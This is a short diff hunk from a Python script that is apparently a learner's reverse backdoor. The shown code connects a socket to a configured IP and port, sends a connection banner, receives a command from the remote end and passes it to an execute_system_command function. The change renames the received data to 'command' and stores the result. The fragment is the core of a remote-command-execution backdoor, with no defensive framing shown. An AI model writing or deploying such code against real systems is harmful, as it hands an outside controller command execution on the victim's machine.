@@ -20,9 +20,9 @@ connection = socket.socket(socket.AF_INET,  socket.SOCK_STREAM) #create instance
 connection.connect((ip, port)) #connect method from connection variable
 connection.send("\n++Connection established++\n") #python3 requires bytes-like object to be passed, not string
 
-received_data = connection.recv(buffer_size) #receive, specify buffer size
+command = connection.recv(buffer_size) #receive, specify buffer size
 #print(received_data)
-execute_system_command(received_data)
+command_result = execute_system_command(command)
 connection.close()
 #connect method takes a tuple
 #takes IP and port arguments
